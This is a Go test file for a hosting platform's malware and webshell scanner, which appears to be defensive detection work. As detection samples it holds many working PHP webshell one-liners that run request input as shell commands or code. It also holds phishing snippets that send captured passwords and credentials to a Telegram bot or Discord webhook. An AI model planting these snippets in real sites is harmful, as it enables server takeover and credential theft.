package sites

import (
	"archive/zip"
	"bytes"
	"context"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const eicar = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`

// fakeClamdscan behaves like clamdscan --infected: "<path>: <sig> FOUND" for
// each infected file, exit 1 if any, 0 if none. It really reads the files.
func fakeClamdscan(_ context.Context, paths ...string) (string, int, error) {
	var out strings.Builder
	for _, p := range paths {
		_ = filepath.WalkDir(p, func(f string, d fs.DirEntry, err error) error {
			if err != nil || d.IsDir() {
				return nil
			}
			if b, _ := os.ReadFile(f); bytes.Contains(b, []byte("EICAR-STANDARD-ANTIVIRUS-TEST-FILE")) {
				fmt.Fprintf(&out, "%s: Eicar-Signature FOUND\n", f)
			}
			return nil
		})
	}
	if out.Len() > 0 {
		return out.String(), 1, nil
	}
	return "", 0, nil
}

func TestPHPThatHidesWhatItDoesIsNamed(t *testing.T) {
	for code, want := range map[string]string{
		`<?php eval(base64_decode("ZWNobyAx"));`:                           "code decoded and then run",
		`<?php @eval(@gzinflate(base64_decode($x)));`:                      "code decoded and then run",
		`<?php assert(str_rot13('riny'));`:                                 "code decoded and then run",
		`<?php eval($_POST['c']);`:                                         "request input run as code",
		`<?php system($_GET['cmd']);`:                                      "request input handed to a shell",
		`<?php shell_exec( $_REQUEST["x"] );`:                              "request input handed to a shell",
		`<?php preg_replace('/.*/e', $_POST['c'], '');`:                    "preg_replace /e (runs its replacement as code)",
		`<?php $f = "\x65\x76\x61\x6c"; $f($c);`:                           "function names spelled in escape sequences",
		`<?php //0046a` + "\n" + `if(!extension_loaded('ionCube Loader'))`: "a commercial PHP encoder (ionCube, SourceGuardian, Zend Guard)",
		`<?php sg_load('ABCD');`:                                           "a commercial PHP encoder (ionCube, SourceGuardian, Zend Guard)",
		`<?php eval('` + strings.Repeat("QUJD", 300) + `');`:               "a large encoded blob run as code",
	} {
		if got := phpObfuscation(code); got != want {
			t.Errorf("%.50q: got %q, want %q", code, got, want)
		}
	}
	// Normal Laravel code, including what looks close.
	for _, code := range []string{
		`<?php return base64_decode($this->token);`,
		`<?php $img = 'data:image/png;base64,` + strings.Repeat("iVBO", 400) + `';`,
		`<?php Route::get('/', fn () => view('welcome'));`,
		`<?php $out = Process::run(['git', 'status']);`,
		`<?php $name = $request->input('name'); echo e($name);`,
		`<?php preg_replace('/\s+/', ' ', $text);`,
		`<?php Str::of($x)->replace('a', 'b');`,
		`<?php $hash = "\x00\x01";`,
		// False positives the audit found in the old hex rule, and ordinary code near the new rules.
		`<?php return str_starts_with($b, "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A");`,
		`<?php $s = str_replace("\xE2\x80\x8B\xE2\x80\x8C", '', $s);`,
		`<?php return $next($request);`,
		`<?php $callback = $this->resolver; return $callback($value);`,
		`<?php $this->assertTrue($ok); Assert::that($x);`,
		`<?php $evaluation = $model->evaluate(); $interval = 5;`,
		`<?php $name = 'system_setting'; $m = 'execute';`,
		`<?php Storage::put('reports/'.$id.'.csv', $csv);`,
		`<?php array_map(fn ($x) => $x * 2, $items);`,
		`<?php $sum = array_sum(array_map('intval', $values));`,
		`<?php $role = $request->input('role'); return view('x', ['role' => $role]);`,
		`<?php // decode the webhook: json_decode(base64_decode($payload))`,
	} {
		if got := phpObfuscation(code); got != "" {
			t.Errorf("normal code flagged (%s): %.70q", got, code)
		}
	}
}

func TestOnlyTheCustomersOwnPHPIsHeldToTheObfuscationRules(t *testing.T) {
	for rel, want := range map[string]bool{
		"/app/Http/Controllers/Shop.php": true, "routes/web.php": true, "public/x.phtml": true, "public/a.phar": true,
		"resources/views/home.blade.php": true, "/vendor/laravel/framework/src/x.php": false, "node_modules/x/y.php": false,
		"public/js/app.js": false, "README.md": false,
	} {
		if got := checkedForObfuscation(rel); got != want {
			t.Errorf("%s: checked=%v, want %v", rel, got, want)
		}
	}
}

func TestAnObfuscatedSaveIsRefusedAndNothingIsWritten(t *testing.T) {
	m, id := historyManager(t)
	err := m.WriteFile(context.Background(), id, "/public/shell.php", `<?php system($_GET['c']);`)
	bad, ok := IsMalware(err)
	if !ok || bad.Findings[0].Kind != "obfuscated" || !strings.Contains(err.Error(), "not allowed on codeinchrome") {
		t.Fatalf("an obfuscated save must be refused as such: %v", err)
	}
	if _, err := os.Stat(filepath.Join(m.appDir(id), "public/shell.php")); !os.IsNotExist(err) {
		t.Fatal("the refused file was written anyway")
	}
	if err := m.WriteFile(context.Background(), id, "/vendor/pkg/Eval.php", `<?php eval(base64_decode($x));`); err != nil {
		t.Fatalf("vendor/ is left to ClamAV, not refused by the PHP rules: %v", err)
	}
}

func TestAMalwareUploadIsRemovedAndNamed(t *testing.T) {
	m, id := historyManager(t)
	err := m.Upload(context.Background(), id, "/public/tool.txt", strings.NewReader(eicar))
	bad, ok := IsMalware(err)
	if !ok || bad.Findings[0].Detail != "Eicar-Signature" || bad.Findings[0].Path != "/public/tool.txt" {
		t.Fatalf("a malware upload must be refused and named: %v", err)
	}
	if _, err := os.Stat(filepath.Join(m.appDir(id), "public/tool.txt")); !os.IsNotExist(err) {
		t.Fatal("the malware stayed on the site")
	}
	if err := m.Upload(context.Background(), id, "/public/ok.txt", strings.NewReader("hello")); err != nil {
		t.Fatalf("a clean upload: %v", err)
	}
}

func TestAScanThatCannotRunNeverCountsAsClean(t *testing.T) {
	m, id := historyManager(t)
	orig := clamdscan
	t.Cleanup(func() { clamdscan = orig })
	clamdscan = func(context.Context, ...string) (string, int, error) {
		return "ERROR: Could not connect to clamd", 2, nil
	}
	err := m.Upload(context.Background(), id, "/public/ok.txt", strings.NewReader("hello"))
	if err == nil || !strings.Contains(err.Error(), "could not be checked for malware") {
		t.Fatalf("an unscanned upload must not be kept: %v", err)
	}
	if _, err := os.Stat(filepath.Join(m.appDir(id), "public/ok.txt")); !os.IsNotExist(err) {
		t.Fatal("an unscanned upload was kept")
	}
	os.MkdirAll(filepath.Join(m.appDir(id), "public"), 0o755)
	os.WriteFile(filepath.Join(m.appDir(id), "public/s.php"), []byte(`<?php passthru($_GET['c']);`), 0o640)
	found, err := m.ScanSite(context.Background(), id)
	if err == nil {
		t.Fatal("a site scan that cannot run must be an error, never a clean result")
	}
	// ...and the rules, which need no clamd, still ran (the audit, 2026-09-25).
	if len(found) != 1 || found[0].Kind != "obfuscated" {
		t.Fatalf("the rule findings must come back with the error: %+v", found)
	}
}

func TestAnArchiveClamAVCannotOpenIsRefusedButIsNotMalware(t *testing.T) {
	enc := refusal([]Finding{{Path: "/x.zip", Kind: "unscannable", Detail: "Heuristics.Encrypted.Zip"}})
	if enc == nil {
		t.Fatal("an encrypted archive must be refused: nothing vouches for what is inside")
	}
	if _, isMalware := IsMalware(enc); isMalware {
		t.Fatal("an encrypted archive is not malware: refusing it must not ban anyone")
	}
	mixed := refusal([]Finding{{Path: "/x.zip", Kind: "unscannable"}, {Path: "/y.exe", Kind: "malware", Detail: "Win.Trojan.X"}})
	if m, isMalware := IsMalware(mixed); !isMalware || len(m.Findings) != 1 || m.Findings[0].Path != "/y.exe" {
		t.Fatalf("malware beside it still counts: %v", mixed)
	}
	if !unscannableSig("Heuristics.Encrypted.Zip") || !unscannableSig("Heuristics.Limits.Exceeded.MaxFileSize") || unscannableSig("Win.Test.EICAR_HDB-1") {
		t.Fatal("signature classes")
	}
}

func TestAnArchiveWithMalwareIsNotUnpackedAtAll(t *testing.T) {
	m, id := historyManager(t)
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, body := range map[string]string{"kit/readme.txt": "hi", "kit/index.php": `<?php eval($_POST['x']);`, "kit/fine.txt": "ok"} {
		w, _ := zw.Create(name)
		w.Write([]byte(body))
	}
	zw.Close()
	os.WriteFile(filepath.Join(m.appDir(id), "kit.zip"), buf.Bytes(), 0o640)
	err := m.Unzip(context.Background(), id, "/kit.zip", "/")
	if _, ok := IsMalware(err); !ok {
		t.Fatalf("an archive holding obfuscated PHP must be refused: %v", err)
	}
	for _, f := range []string{"kit/readme.txt", "kit/index.php", "kit/fine.txt"} {
		if _, err := os.Stat(filepath.Join(m.appDir(id), f)); !os.IsNotExist(err) {
			t.Errorf("%s was left behind by a refused archive", f)
		}
	}
}

func TestASiteScanNamesMalwareAndObfuscationButNotVendor(t *testing.T) {
	m, id := historyManager(t)
	root := m.appDir(id)
	os.MkdirAll(filepath.Join(root, "public"), 0o755)
	os.MkdirAll(filepath.Join(root, "vendor/pkg"), 0o755)
	os.WriteFile(filepath.Join(root, "public/eicar.txt"), []byte(eicar), 0o640)
	os.WriteFile(filepath.Join(root, "public/s.php"), []byte(`<?php passthru($_GET['c']);`), 0o640)
	os.WriteFile(filepath.Join(root, "vendor/pkg/Loader.php"), []byte(`<?php eval(base64_decode($x));`), 0o640)
	found, err := m.ScanSite(context.Background(), id)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, f := range found {
		got[f.Path] = f.Kind
	}
	if got["/public/eicar.txt"] != "malware" || got["/public/s.php"] != "obfuscated" {
		t.Errorf("findings: %v", found)
	}
	if _, bad := got["/vendor/pkg/Loader.php"]; bad {
		t.Errorf("vendor/ is ClamAV's, not the PHP rules': %v", found)
	}
}

// Every bypass the second security audit (2026-09-25) found: 17 webshell
// forms none of the old rules caught.
func TestTheAuditsWebshellVariantsAreAllCaught(t *testing.T) {
	for _, code := range []string{
		`<?php create_function('', $_POST['c']);`,
		`<?php $f=$_GET['x'];$f($_GET['y']);`,
		`<?php $_GET['a']($_GET['b']);`,
		`<?php $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f($x);`,
		`<?php $f = "\163\171\163\164\145\155"; $f($x);`,
		"<?php echo `$_GET[c]`;",
		`<?php $c=$_GET['c'];system($c);`,
		`<?php $a='ba'.'se64_decode';eval($a($_POST['x']));`,
		`<?php $a='ba'.'se64_decode'; $b = $a($p);`,
		`<?php eval/**/(base64_decode($x));`,
		`<?php $x=base64_decode($p);eval($x);`,
		`<?php eval("?>".base64_decode($p));`,
		`<?php include $_GET['p'];`,
		`<?php call_user_func($_REQUEST['f'], $_REQUEST['a']);`,
		`<?php array_map($_POST['f'], [$_POST['a']]);`,
		`<?php file_put_contents(__DIR__.'/x.php', base64_decode($_POST['d']));`,
		`<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); }`,
		`<?php ($_=@$_GET[2]).@$_($_GET[1]);`,
		`<?php $f = "sy\x73tem"; $f($_GET['c']);`,
	} {
		if phpObfuscation(code) == "" {
			t.Errorf("not caught: %q", code)
		}
	}
	// JavaScript template strings in a Blade view are not shell commands.
	if got := phpObfuscation("<script>const u = `/items/${id}`;</script>", true); got != "" {
		t.Errorf("a Blade view's JavaScript was flagged: %s", got)
	}
}

func TestWhatACommandWroteIsHeldToTheRules(t *testing.T) {
	m, id := historyManager(t)
	root := m.appDir(id)
	os.MkdirAll(filepath.Join(root, "app"), 0o755)
	os.MkdirAll(filepath.Join(root, "vendor/pkg"), 0o755)
	before := time.Now().Add(-time.Hour)
	old := filepath.Join(root, "app/Old.php")
	os.WriteFile(old, []byte(`<?php eval($x);`), 0o640) // there before: the scheduled scan's job
	os.Chtimes(old, before, before)
	since := time.Now().Add(-time.Second)
	os.WriteFile(filepath.Join(root, "vendor/pkg/Lib.php"), []byte(`<?php eval($x);`), 0o640)
	if bad := m.ScanChangedSince(id, since); bad != nil {
		t.Fatalf("vendor/ and files older than the command are not this check's: %v", bad)
	}
	os.WriteFile(filepath.Join(root, "app/Shell.php"), []byte(`<?php system($_GET['c']);`), 0o640)
	if bad := m.ScanChangedSince(id, since); bad == nil || bad.Findings[0].Path != "/app/Shell.php" {
		t.Fatalf("a file the command wrote must be caught: %v", bad)
	}
}

func TestPhishingKitsAreNamedForReviewAndOrdinaryPagesAreNot(t *testing.T) {
	for code, want := range map[string]string{
		`<?php file_get_contents("https://api.telegram.org/bot123:ABC/sendMessage?chat_id=1&text=".urlencode($_POST["pass"]));`: "sends data to a Telegram bot",
		`fetch("https://discord.com/api/webhooks/1/abc", {method: "POST", body: JSON.stringify(creds)})`:                        "sends data to a Discord webhook",
		`<?php if (preg_match('/phishtank|netcraft|google/i', $_SERVER['HTTP_USER_AGENT'])) { http_response_code(404); exit; }`: "hides the page from security scanners",
		`<h1>PayPal</h1><form><input name="cvv"><input autocomplete="cc-number"></form>`:                                        "asks for a card number beside a well-known brand",
	} {
		if got := phishingKit(code); got != want {
			t.Errorf("%.50q: got %q, want %q", code, got, want)
		}
	}
	for _, code := range []string{
		`<form><input autocomplete="cc-number" name="card"></form><p>Pay for your coffee</p>`,
		`<?php Log::info('visit', ['ua' => $request->userAgent()]);`,
		`<a href="https://t.me/ourshop">Telegram channel</a>`,
	} {
		if got := phishingKit(code); got != "" {
			t.Errorf("ordinary page flagged (%s): %.60q", got, code)
		}
	}
}
